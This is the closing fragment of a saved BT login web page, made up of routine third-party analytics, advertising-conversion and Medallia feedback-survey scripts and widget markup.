src="https://www.facebook.com/tr?id=1972644539646168&amp;ev=ViewContent&amp;noscript=1" style="display:none" width="1" height="1" border="0"><script>_satellite["__runScript7"](function(event, target) {
_satellite.track("set_previous_page_name_cookie");
});</script><script type="text/javascript" src="https://track.uniqodo.com/7"></script><script>_satellite["__runScript8"](function(event, target) {
gtag||_satellite.logger.warn("gTag not present");try{var pixels=_satellite.getVar("gtag doubleclick pixels");pixels&&0<pixels.length?pixels.forEach(function(e){gtag("event","conversion",{allow_custom_scripts:!0,u25:_satellite.getVar("Friendly Page Url"),send_to:e.id+"/"+e.type+"/"+e.cat+"+standard"})}):_satellite.logger.log("No DoubleClick pixels to fire.")}catch(e){_satellite.logger.error(e)}
});</script><script>_satellite["__runScript9"](function(event, target) {
!function(t,o){function a(e){return{provider:"Medallia",form:{id:e.detail.Form_ID,type:"AlwaysOn"==e.detail.Form_Type?"Feedback":"Invite"},attributes:{form:{type:e.detail.Form_Type},event:{type:e.type}}}}var e=document.createElement("script");e.src="https://resources.digital-cloud-uk.medallia.eu/wdcuk/244/onsite/embed",document.body.appendChild(e),window.addEventListener("MDigital_Feedback_Button_Clicked",function(e){o.trigger("NPS.Feedback.Button.clicked",a(e))}),window.addEventListener("MDigital_Form_Displayed",function(e){o.trigger("NPS.Form.shown",a(e))}),window.addEventListener("MDigital_Form_Close_No_Submit",function(e){o.trigger("NPS.Form.cancelled",a(e))}),window.addEventListener("MDigital_Invite_Declined",function(e){o.trigger("NPS.Form.declined",a(e))}),window.addEventListener("MDigital_Submit_Feedback",function(e){if(e&&e.detail&&e.detail.Feedback_UUID){var t=a(e);if(t.submission={id:e.detail.Feedback_UUID,fields:[]},typeof e.detail.Content==typeof[])for(var i,n=0,d=e.detail.Content.length;n<d;n++)i=e.detail.Content[n],t.submission.fields.push({id:i.id,name:i.unique_name,value:i.value,attributes:{type:i.type}});o.trigger("NPS.Form.submitted",t)}}),o.on(["NPS.Feedback.Button.clicked","NPS.Form.cancelled","NPS.Form.declined","NPS.Form.shown","NPS.Form.submitted"],function(e){t.track("NPS Interaction",e)},{label:"Adobe Analytics"})}(_satellite,_exhaust);
});</script><script src="https://resources.digital-cloud-uk.medallia.eu/wdcuk/244/onsite/embed"></script><iframe style="display: none; visibility: hidden;" src="https://2768331.fls.doubleclick.net/activityi;src=2768331;type=landt285;cat=pns-b00;ord=7054059773448;gtm=2ou3p1;auiddc=1652493783.1585790176;u25=home.bt.com%2Flogin%2Floginform;~oref=https%3A%2F%2Fhome.bt.com%2Flogin%2Floginform%3FTARGET%3D%24SM%24https%253A%252F%252Fsignin1.bt.com%252Fbtmail%252Fsecure%252Femaillogin?" width="0" height="0"></iframe><script>_satellite["__runScript10"](function(event, target) {
gtag("event","conversion",{allow_custom_scripts:!0,u25:_satellite.getVar("Friendly Page Url"),send_to:"DC-2768331/landt285/pns-b00+standard"});
});</script><script type="text/javascript">
	try {var __scP=(document.location.protocol=="https:")?"https://":"http://";
	var __scS=document.createElement("script");__scS.type="text/javascript";
	__scS.async=true;__scS.src=__scP+"d16fk4ms6rqz1v.cloudfront.net/capture/BT";
	document.getElementsByTagName("head")[0].appendChild(__scS);}catch(e){}
</script><script>(function(w,d,t,r,u){var f,n,i;w[u]=w[u]||[],f=function(){var o={ti:"5063977"};o.q=w[u],w[u]=new UET(o),w[u].push("pageLoad")},n=d.createElement(t),n.src=r,n.async=1,n.onload=n.onreadystatechange=function(){var s=this.readyState;s&&s!=="loaded"&&s!=="complete"||(f(),n.onload=n.onreadystatechange=null)},i=d.getElementsByTagName(t)[0],i.parentNode.insertBefore(n,i)})(window,document,"script","//bat.bing.com/bat","uetq");</script><noscript></noscript><script>_satellite["__runScript11"](function(event, target) {
var pageName=_satellite.getVar("Page Name");pageName&&(document.cookie="_analytics_prev_pagename="+pageName+";domain=.bt.com;path=/");
});</script><script src="assets/260320/globalheader/bt.cookies"></script><script type="text/javascript" async="" src="https://resources.digital-cloud-uk.medallia.eu/wdcuk/244/onsite/generic1585233832875" charset="UTF-8"></script><span></span><span id="kampyleButtonContainer"><button id="nebula_div_btn" class="nebula_image_button  noOutline " style="z-index: 99999990 !important; position: fixed !important; cursor: pointer !important; line-height: 1px !important; padding: 0px; right: 0px; top: 50%; border: medium none; margin-top: 0px;" tabindex="0"><img alt="Feedback" src="https://resources.digital-cloud-uk.medallia.eu/wdcuk/244/resources/image/1534441432041_Feedback-Desktop-35X112px.png"></button></span><span id="formLightboxContainer"><div id="kampyleFormContainer" style="top:0 !important;left:0 !important;width: 100% !important;height: 100% !important;position: fixed !important;visibility:hidden !important;display:table !important;background-color: rgba(102,102,102,0.4) !important;z-index:99999999 !important;-webkit-overflow-scrolling: touch !important; "> <div id="innerContainer">   <img class="neb-loading-spinner" alt="Loading" style="position: absolute !important; top: 50% !important; left: 50% !important; margin-top: -30px !important; margin-left: -30px !important; max-width: 60px !important; display: none;" src="https://resources.digital-cloud-uk.medallia.eu/resources/onsite/images/kloader.gif">   <div id="kampyleFormModal" style="z-index:99999999 !important; -webkit-overflow-scrolling: touch !important;"><iframe style="border: 0px none !important; height: 100% !important; max-height: 100% !important; min-height: 100% !important; width: 100% !important; max-width: 100% !important; min-width: 100% !important; display: none !important; position: fixed !important;" id="kampyleForm126" src="https://resources.digital-cloud-uk.medallia.eu/wdcuk/244/forms/126/form1574249335416.html?formId=126&amp;type=live&amp;referrer=https%3A%2F%2Fhome.bt.com%2Flogin%2Floginform&amp;region=digital-cloud-uk&amp;displayType=lightbox" title="Feedback Survey" origin="https://resources.digital-cloud-uk.medallia.eu"></iframe></div> </div></div></span><span><div id="KampyleAnimationContainer" style="z-index: 2147483000; border: 0px none; position: fixed; display: block;"></div></span></body></html>